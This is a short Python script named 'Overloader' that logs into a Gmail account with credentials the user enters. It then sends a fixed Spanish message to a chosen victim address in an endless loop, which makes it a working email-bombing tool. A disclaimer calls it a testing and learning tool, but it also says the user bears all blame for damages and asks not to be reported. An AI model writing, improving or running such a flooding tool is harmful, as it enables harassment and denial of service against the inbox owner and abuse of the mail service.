# Overloader 1.2.2
import smtplib
import getpass
import os
import sys
try:
    if sys.argv[1] == "--version":
        print("1.2.1")
        e = 1
    else:
        e = 0
except:
    e = 0
    
if e == 1:
    sys.exit(0)
def spammail():
    us = input("Your Email> ")
    fromaddr = us
    to = input("Email to overload> ")
    toaddrs = to
    msg = 'Estas sufriendo una sobrecarga de emails enviados por Python'
    # Datos
    username = us
    print("Type your password here")
    password = getpass.getpass()
    #Sending the emails
    n = 1
    emenviados = 0
    while n == 1:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(username, password)
        server.sendmail(fromaddr, toaddrs, msg)
        server.quit()
print("Welcome to Multi Overloader")
print(" ")
print("WARNING, you have the responsability for the damages caused by this software, this program was developed only for testing and learning purposes, not attacking purposes")
print("do not report us, since we have warned you in advance indicating that the fault of all the damages is yours")
print("Do you want to continue? [y/N]")
e = input()
if e.lower() == "y":
    print(" ")
    print("Select your method")
    print(" ")
    print("a. Email Overload (Classic one)")
    e = input("Select: ")
    if e == "a":
        spammail()

